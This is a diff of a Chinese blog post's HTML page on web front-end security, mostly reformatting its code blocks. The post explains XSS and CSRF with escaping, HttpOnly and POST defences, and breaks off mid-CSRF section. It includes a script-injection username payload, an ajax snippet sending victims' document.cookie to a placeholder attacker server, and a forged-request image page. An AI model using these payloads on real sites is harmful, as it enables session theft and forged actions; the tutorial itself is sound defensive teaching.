@@ -69,7 +69,7 @@
 <meta itemprop="name" content="前端其他问题-来自分享">
 <meta itemprop="description" content="==1. WEB前端安全那些事儿== 前端攻击都有哪些形式，我该如何防范？ XSS攻击 是什么？ XSS是一种经常出现在web应用中的计算机安全漏洞，它允许"><meta itemprop="datePublished" content="2018-05-06T17:17:14+00:00" />
 <meta itemprop="dateModified" content="2018-05-06T17:17:14+00:00" />
-<meta itemprop="wordCount" content="13405">
+<meta itemprop="wordCount" content="13552">
 <meta itemprop="keywords" content="前端," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="前端其他问题-来自分享"/>
 <meta name="twitter:description" content="==1. WEB前端安全那些事儿== 前端攻击都有哪些形式，我该如何防范？ XSS攻击 是什么？ XSS是一种经常出现在web应用中的计算机安全漏洞，它允许"/>
@@ -161,64 +161,6 @@
   </ul>
 </nav>
 
-
-  
-    
-
-
-
-
-
-
-  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
-  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
-
-
-
-
-<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
-
-<div class="pswp__bg"></div>
-
-<div class="pswp__scroll-wrap">
-    
-    <div class="pswp__container">
-      <div class="pswp__item"></div>
-      <div class="pswp__item"></div>
-      <div class="pswp__item"></div>
-    </div>
-    
-    <div class="pswp__ui pswp__ui--hidden">
-    <div class="pswp__top-bar">
-      
-      <div class="pswp__counter"></div>
-      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-      <button class="pswp__button pswp__button--share" title="Share"></button>
-      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-      
-      
-      <div class="pswp__preloader">
-        <div class="pswp__preloader__icn">
-          <div class="pswp__preloader__cut">
-            <div class="pswp__preloader__donut"></div>
-          </div>
-        </div>
-      </div>
-    </div>
-    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-      <div class="pswp__share-tooltip"></div>
-    </div>
-    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-    </button>
-    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-    </button>
-    <div class="pswp__caption">
-      <div class="pswp__caption__center"></div>
-    </div>
-    </div>
-    </div>
-</div>
 
   
 
@@ -344,8 +286,8 @@
             <a href="https://bomir.top/categories/%E5%89%8D%E7%AB%AF/"> 前端 </a>
             
           </div>
-        <span class="more-meta"> 约 13405 字 </span>
-          <span class="more-meta"> 预计阅读 27 分钟 </span>
+        <span class="more-meta"> 约 13552 字 </span>
+          <span class="more-meta"> 预计阅读 28 分钟 </span>
 
         
         
@@ -419,125 +361,145 @@
 <h4 id="是什么">是什么？</h4>
 <p>XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。举个例子，我们有个社交网站，允许大家相互访问空间，网站可能是这样做的：其实在web前端方面，可以简单的理解为一种javascript代码注入。
 ​</p>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#000;font-weight:bold">&lt;?</span>php
-    <span style="color:#008080">$username</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;侯医生&#34;</span>;
-<span style="color:#999;font-weight:bold;font-style:italic">?&gt;</span><span style="color:#a61717;background-color:#e3d2d2">
-</span><span style="color:#a61717;background-color:#e3d2d2">&lt;!DOCYTPE HTML&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">&lt;html&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">    &lt;head&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;meta charset=&#34;utf-8&#34; /&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">    &lt;/head&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">    &lt;body&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;div&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">            用户名：&lt;?php echo $username;?&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;/div&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;div&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">            第一条状态：侯医生的状态1
-</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;/div&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;div&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">            第二条状态：侯医生的状态2
-</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;/div&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;div&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">            第三条状态：侯医生的状态3
-</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;/div&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">    &lt;/body&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">&lt;/html&gt;
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+    <span class="nv">$username</span><span class="o">=</span><span class="s2">&#34;侯医生&#34;</span><span class="p">;</span>
+<span class="cp">?&gt;</span><span class="err">
+</span><span class="err">&lt;!DOCYTPE HTML&gt;
+</span><span class="err">&lt;html&gt;
+</span><span class="err">    &lt;head&gt;
+</span><span class="err">        &lt;meta charset=&#34;utf-8&#34; /&gt;
+</span><span class="err">    &lt;/head&gt;
+</span><span class="err">    &lt;body&gt;
+</span><span class="err">        &lt;div&gt;
+</span><span class="err">            用户名：&lt;?php echo $username;?&gt;
+</span><span class="err">        &lt;/div&gt;
+</span><span class="err">        &lt;div&gt;
+</span><span class="err">            第一条状态：侯医生的状态1
+</span><span class="err">        &lt;/div&gt;
+</span><span class="err">        &lt;div&gt;
+</span><span class="err">            第二条状态：侯医生的状态2
+</span><span class="err">        &lt;/div&gt;
+</span><span class="err">        &lt;div&gt;
+</span><span class="err">            第三条状态：侯医生的状态3
+</span><span class="err">        &lt;/div&gt;
+</span><span class="err">    &lt;/body&gt;
+</span><span class="err">&lt;/html&gt;
 </span></code></pre></td></tr></table>
 </div>
 </div><p>运行时，展现形式如图所示：</p>
 <p><img src="https://segmentfault.com/img/bVB9cO" alt="image"></p>
 <p>但是，如果你的用户名，起名称的时候，带上script标签呢？我们知道，浏览器遇到html中的script标签的时候，会解析并执行标签中的js脚本代码，那么如果你的用户名称里面含有script标签的话，就可以执行其中的代码了。代码如下，效果如图</p>
-<pre><code>&lt;?php
-    $username=&quot;&lt;script&gt;alert('侯医生');&lt;/script&gt;&quot;;
-?&gt;
-</code></pre><p><img src="https://segmentfault.com/img/bVB9or" alt="image"></p>
-<p>如果你将自己的用户名设定为这种执行脚本的方式，再让别人去访问你的连接的话，就可以达到在他人web环境中，执行自己脚本的效果了。我们还可以使用ajax，将其他用户在当前域名下的cookie获取并发送到自己的服务器上。这样就可以获取他人信息了。比如，刚刚咱们使用的不是alert而是，如下的代码：</p>
-<pre><code>$.ajax({
-    url: '自己的服务器',
-    dataType: 'jsonp',
-    data: {'盗取的用户cookie': document.cookie}
-});
-</code></pre><h4 id="如何防范">如何防范</h4>
-<p>目前来讲，最简单的办法防治办法，还是将前端输出数据都进行转义最为稳妥。比如，按照刚刚我们那个例子来说，其本质是，浏览器遇到script标签的话，则会执行其中的脚本。但是如果我们将script标签的进行转义，则浏览器便不会认为其是一个标签，但是显示的时候，还是会按照正常的方式去显示，代码如下，效果如图</p>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#000;font-weight:bold">&lt;?</span>php
-    <span style="color:#008080">$username</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#34;&lt;script&gt;alert(&#39;侯医生&#39;);&lt;/script&gt;&#34;</span>;
-<span style="color:#999;font-weight:bold;font-style:italic">?&gt;</span><span style="color:#a61717;background-color:#e3d2d2">
-</span><span style="color:#a61717;background-color:#e3d2d2">&lt;!DOCYTPE HTML&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">&lt;html&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">    &lt;head&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;meta charset=&#34;utf-8&#34; /&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">    &lt;/head&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">    &lt;body&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;!--我们将输出的后端变量，转义之后再输出，则可以避免被注入代码--&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;div&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">            用户名：&lt;?php echo htmlentities($username);?&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;/div&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;div&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">            第一条状态：侯医生的状态1
-</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;/div&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;div&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">            第二条状态：侯医生的状态2
-</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;/div&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;div&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">            第三条状态：侯医生的状态3
-</span><span style="color:#a61717;background-color:#e3d2d2">        &lt;/div&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">    &lt;/body&gt;
-</span><span style="color:#a61717;background-color:#e3d2d2">&lt;/html&gt;
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?php
+    $username=&#34;&lt;script&gt;alert(&#39;侯医生&#39;);&lt;/script&gt;&#34;;
+?&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://segmentfault.com/img/bVB9or" alt="image"></p>
+<p>如果你将自己的用户名设定为这种执行脚本的方式，再让别人去访问你的连接的话，就可以达到在他人web环境中，执行自己脚本的效果了。我们还可以使用ajax，将其他用户在当前域名下的cookie获取并发送到自己的服务器上。这样就可以获取他人信息了。比如，刚刚咱们使用的不是alert而是，如下的代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">$.ajax({
+    url: &#39;自己的服务器&#39;,
+    dataType: &#39;jsonp&#39;,
+    data: {&#39;盗取的用户cookie&#39;: document.cookie}
+});
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="如何防范">如何防范</h4>
+<p>目前来讲，最简单的办法防治办法，还是将前端输出数据都进行转义最为稳妥。比如，按照刚刚我们那个例子来说，其本质是，浏览器遇到script标签的话，则会执行其中的脚本。但是如果我们将script标签的进行转义，则浏览器便不会认为其是一个标签，但是显示的时候，还是会按照正常的方式去显示，代码如下，效果如图</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+    <span class="nv">$username</span><span class="o">=</span><span class="s2">&#34;&lt;script&gt;alert(&#39;侯医生&#39;);&lt;/script&gt;&#34;</span><span class="p">;</span>
+<span class="cp">?&gt;</span><span class="err">
+</span><span class="err">&lt;!DOCYTPE HTML&gt;
+</span><span class="err">&lt;html&gt;
+</span><span class="err">    &lt;head&gt;
+</span><span class="err">        &lt;meta charset=&#34;utf-8&#34; /&gt;
+</span><span class="err">    &lt;/head&gt;
+</span><span class="err">    &lt;body&gt;
+</span><span class="err">        &lt;!--我们将输出的后端变量，转义之后再输出，则可以避免被注入代码--&gt;
+</span><span class="err">        &lt;div&gt;
+</span><span class="err">            用户名：&lt;?php echo htmlentities($username);?&gt;
+</span><span class="err">        &lt;/div&gt;
+</span><span class="err">        &lt;div&gt;
+</span><span class="err">            第一条状态：侯医生的状态1
+</span><span class="err">        &lt;/div&gt;
+</span><span class="err">        &lt;div&gt;
+</span><span class="err">            第二条状态：侯医生的状态2
+</span><span class="err">        &lt;/div&gt;
+</span><span class="err">        &lt;div&gt;
+</span><span class="err">            第三条状态：侯医生的状态3
+</span><span class="err">        &lt;/div&gt;
+</span><span class="err">    &lt;/body&gt;
+</span><span class="err">&lt;/html&gt;
 </span></code></pre></td></tr></table>
 </div>
 </div><p><img src="https://segmentfault.com/img/bVB9qd" alt="image"></p>
@@ -546,12 +508,49 @@
 虽然显示出来是有script标签的，但是实际上，script标签的左右尖括号(&gt;&lt;)，均被转义为html字符实体，所以，便不会被当做标签来解析的，但是实际显示的时候，这两个尖括号，还是可以正常展示的。</p>
 <h4 id="升级防御">升级防御</h4>
 <p>我们将输出的字符串中的\反斜杠进行转义(json转义)。这样，\就不会被当做unicode码的开头来被处理了。代码如下：</p>
-<pre><code>document.getElementById('username_info').innerHTML = &lt;?php echo json_encode(htmlentities($username));?&gt;;
-</code></pre><p>都说了道高一尺魔高一丈了，你以为防得住后端输出，黑客大大们就没办法攻击了吗。我们有的时候，会有一些习惯，拿URL上的get参数去构建网页。好比说，直接拿url上的用户名去展示啦，拿url上的一些回跳地址之类的。但是url上的参数，我们是无法提前对其进行转义的。接下来，来个例子，代码如下：</p>
-<pre><code>&lt;html&gt;
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">document.getElementById(&#39;username_info&#39;).innerHTML = &lt;?php echo json_encode(htmlentities($username));?&gt;;
+</code></pre></td></tr></table>
+</div>
+</div><p>都说了道高一尺魔高一丈了，你以为防得住后端输出，黑客大大们就没办法攻击了吗。我们有的时候，会有一些习惯，拿URL上的get参数去构建网页。好比说，直接拿url上的用户名去展示啦，拿url上的一些回跳地址之类的。但是url上的参数，我们是无法提前对其进行转义的。接下来，来个例子，代码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">&lt;html&gt;
     &lt;head&gt;
-        &lt;meta charset=&quot;utf-8&quot; /&gt;
-        &lt;script src=&quot;https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js&quot;&gt;&lt;/script&gt;
+        &lt;meta charset=&#34;utf-8&#34; /&gt;
+        &lt;script src=&#34;https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js&#34;&gt;&lt;/script&gt;
     &lt;/head&gt;
     &lt;body&gt;
         &lt;div&gt;
@@ -566,27 +565,48 @@
         &lt;div&gt;
             第三条状态：侯医生的状态3
         &lt;/div&gt;
-        &lt;div&gt;版权所有：&lt;span id=&quot;username_info&quot;&gt;&lt;/span&gt;&lt;/div&gt;
+        &lt;div&gt;版权所有：&lt;span id=&#34;username_info&#34;&gt;&lt;/span&gt;&lt;/div&gt;
         &lt;script&gt;
             var param = /=(.+)$/.exec(location.search);
             var value = decodeURIComponent(param[1]);
-            $('#username_info').append(value);
+            $(&#39;#username_info&#39;).append(value);
         &lt;/script&gt;
     &lt;/body&gt;
 &lt;/html&gt;
-</code></pre><p>上述代码，满足了一个很正常的需求，解开URL中的一个参数，并将其渲染至页面上。但是，这里面存在一个风险，如果黑客在URL的这个参数中，加入js代码，这样便又会被执行。</p>
+</code></pre></td></tr></table>
+</div>
+</div><p>上述代码，满足了一个很正常的需求，解开URL中的一个参数，并将其渲染至页面上。但是，这里面存在一个风险，如果黑客在URL的这个参数中，加入js代码，这样便又会被执行。</p>
 <p><img src="https://segmentfault.com/img/bVB9zm" alt="image"></p>
 <p>像这种从url中获取的信息，笔者建议，最好由后端获取，在前端转义后再行输出，代码如下，效果如图</p>
-<pre><code>&lt;script&gt;
-    var value = decodeURIComponent(&quot;&lt;?php echo htmlentities($_GET['username']);?&gt;&quot;);
-    $('#username_info').append(value);
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">&lt;script&gt;
+    var value = decodeURIComponent(&#34;&lt;?php echo htmlentities($_GET[&#39;username&#39;]);?&gt;&#34;);
+    $(&#39;#username_info&#39;).append(value);
 &lt;/script&gt;
-</code></pre><p><img src="https://segmentfault.com/img/bVB9zP" alt="image"></p>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://segmentfault.com/img/bVB9zP" alt="image"></p>
 <p>如果不幸中招了，黑客的js真的在我们的网页上执行了，我们该怎么办。其实，很多时候，我们的敏感信息都是存储在cookie中的（不要把用户机密信息放在网页中），想要阻止黑客通过js访问到cookie中的用户敏感信息。那么请使用cookie的HttpOnly属性，加上了这个属性的cookie字段，js是无法进行读写的。php的设置方法如下：</p>
-<pre><code>&lt;?php
-    setcookie(&quot;userpass&quot;, &quot;doctorhou-shuai&quot;, NULL, NULL, NULL, NULL, TRUE);
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?php
+    setcookie(&#34;userpass&#34;, &#34;doctorhou-shuai&#34;, NULL, NULL, NULL, NULL, TRUE);
 ?&gt;
-</code></pre><p>如图，我们的cookie已经种上了，并且有了httpOnly标识
+</code></pre></td></tr></table>
+</div>
+</div><p>如图，我们的cookie已经种上了，并且有了httpOnly标识
 <img src="https://segmentfault.com/img/bVB9Hh" alt="image">
 我们通过js无法获取cookie中的设定有httpOnly的字段：
 <img src="https://segmentfault.com/img/bVB9Hv" alt="image"></p>
@@ -597,64 +617,138 @@ CSRF（Cross-site request forgery跨站请求伪造，也被称为“One Click A
 <h4 id="如何攻击">如何攻击？</h4>
 <h5 id="要合理使用post与get">要合理使用post与get</h5>
 <p>通常我们会为了省事儿，把一些应当提交的数据，做成get请求。殊不知，这不仅仅是违反了http的标准而已，也同样会被黑客所利用。比如，你开发的网站中，有一个购买商品的操作。你是这么开发的：</p>
-<pre><code>&lt;?php
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?php
 // 从cookie中获取用户名，看似稳妥
-$username = $_COOKIE['username'];
-$productId = $_GET['pid'];
+$username = $_COOKIE[&#39;username&#39;];
+$productId = $_GET[&#39;pid&#39;];
 // 这里进行购买操作
 //store_into_database($username, $productId);
 ?&gt;
-&lt;meta charset=&quot;utf-8&quot; /&gt;
+&lt;meta charset=&#34;utf-8&#34; /&gt;
 &lt;?php
-echo $username . '买入商品：' . $productId;
+echo $username . &#39;买入商品：&#39; . $productId;
 ?&gt;
-</code></pre><p>而商品ID图个省事儿，就使用了url中的get参数。买商品的话，如图</p>
+</code></pre></td></tr></table>
+</div>
+</div><p>而商品ID图个省事儿，就使用了url中的get参数。买商品的话，如图</p>
 <p><img src="https://segmentfault.com/img/bVB9Ca" alt="image"></p>
 <p>那么，黑客的网站可以这样开发：</p>
 <!-- raw HTML omitted -->
-<pre><code>&lt;html&gt;
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">&lt;html&gt;
     &lt;head&gt;
-        &lt;meta charset=&quot;utf-8&quot; /&gt;
+        &lt;meta charset=&#34;utf-8&#34; /&gt;
     &lt;/head&gt;
     &lt;body&gt;
-        &lt;img src=&quot;http://localhost:8082/lab/xsrflab/submit.php?pid=1&quot; /&gt;
+        &lt;img src=&#34;http://localhost:8082/lab/xsrflab/submit.php?pid=1&#34; /&gt;
     &lt;/body&gt;
 &lt;/html&gt;
-</code></pre><p>这样的话，用户只需要访问一次黑客的网站，其实就相当于在你的网站中，操作了一次。然而用户却没有感知。</p>
+</code></pre></td></tr></table>
+</div>
+</div><p>这样的话，用户只需要访问一次黑客的网站，其实就相当于在你的网站中，操作了一次。然而用户却没有感知。</p>
 <p>如果你使用了post请求来处理关键业务的，还是有办法可以破解的。我们的业务代码如下：</p>
-<pre><code>&lt;?php
-$username = $_COOKIE['username'];
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?php
+$username = $_COOKIE[&#39;username&#39;];
 // 换为post了，可以规避黑客直接的提交
-$productId = $_POST['pid'];
+$productId = $_POST[&#39;pid&#39;];
 // 这里进行购买操作
